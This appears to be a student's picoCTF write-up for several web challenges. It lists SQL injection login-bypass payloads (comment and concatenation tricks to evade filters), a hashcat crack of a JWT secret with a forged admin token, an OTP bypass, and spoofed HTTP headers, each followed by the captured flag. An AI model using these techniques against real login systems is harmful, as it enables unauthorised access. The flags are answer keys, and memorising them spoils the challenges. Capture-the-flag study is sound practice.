1.) web gaunglet 1:-

a.) Round 1:-

username :- admin'--
password :- 123(can be anything)

reason :- As we can see in the filter.php that we have filters on 'or' which mean we can use anything else than that , to seeing the sql response we used this to the use of the username is , 'admin' part is just the special username and the "'" just closed the pre-existing "'" and the "--" just comments the pre-existing sql query making every password valid

b.) Round 2:-

username :- admin'/*
password :- 123(cam be anything)

reason :- In this the username is admin which is again the special username and "/*" is just another way to comment the sql query after ending "'" earlier thus all the passwords are accepted

c.) Round 3:-

username :- admin'/*
password :- 123(cam be anything)

reason :- The things that we used are ok and are not being filtered by the website till now

d.) Round 4:-

username :- ad'||'min'/*
password :- 123(can be anything)

reason :- as the word admin itself was beinf filtered so we used the concatinating symbol "||" and concantinated the string 'ad' and 'min' and after making the username "admin" we commented the whole of the sql query

e.) Round 5:-

username :- ad'||'min'/*
password :- 123(can be anything)

reason :- The things that we used are ok and are not being filtered by the website till now

flag :- picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}

2.) Web gaunglet 2:-

username:- ad'||'min
password:- 1' IS NOT '2

reason :- now if we observe that the sql command checks for both username and password and there are extra "'" that are being putted at the start and also at the end of the statement , so the easiest way is to first concatinate admin and then somehow make the password part of the query as "true" but as it is already filtered so we can use logical comparision to make it end as true

flag :- picoCTF{0n3_m0r3_t1m3_e2db86ae880862ad471aa4c93343b2bf}

3.) web gaunglet 3 :-

username:- ad'||'min
password:- 1' IS NOT '2

flag :- picoCTF{k3ep_1t_sh0rt_eb90a623e2c581bcd3127d9d60a4dead}

4.) JAWT ScratchPad:-

so first we used burp suite to get the jwt token , we editted it using thw website "https://supertokens.com/jwt-encoder-decoder" , then we saw that we get to see the username we inputted then we used hashcat to get the secretkey used as we can see the hashing is sha265 and we have the rockyou.txt for this so used the commands "hashcat -a0 -m 16500 a.txt rockyou.txt" and found that the key was "ilovepico" used it got the new jwt token used and found the flag , the new jwt token being "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s"

flag:- picoCTF{jawt_was_just_what_you_thought_1ca14548}

5.) Secrets:-

so it this one we just have to go through the inspect element and find out the directories , present which were "secret/hidden/superhidden/"

flag :- picoCTF{succ3ss_@h3n1c@10n_39849bcf}

6.) IntroToBurp:-

So i saw the hint 2 which said that the server side does not handle the query well , so mangle with it , so just sent the otp request to repeater and then magled a lot in the end i removed the otp section fully and voila we got the flag

flag :- picoCTF{#0TP_Bypvss_SuCc3$S_9090d63c}

7.) Client-side-again:-

So in this as the name suggested we have to first go to the inspect element and then we see the JS code which is obfuscated , when put into multiple de-obfuscators , it was of no use , then i used the changing of variables in VS-CODE and got to know that , the first is rottated left by 435 elements and we get the final list , then start changing the names with what were present in the list , and got the flag because it was simple substringing.

flag :- picoCTF{not_this_again_ef49bf}

8.) Who are you ? :-

final header :-

GET / HTTP/1.1
Host: mercury.picoctf.net:52362
Referer:mercury.picoctf.net:52362
Date:Sun, 06 Nov 2018 08:49:37 GMT
DNT:1
Cache-Control: max-age=0
Accept-Language:sv-SE,sv;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: PicoBrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
X-Forwarded-For: 88.80.6.19
Connection: keep-alive

flag :- picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_0c0db339}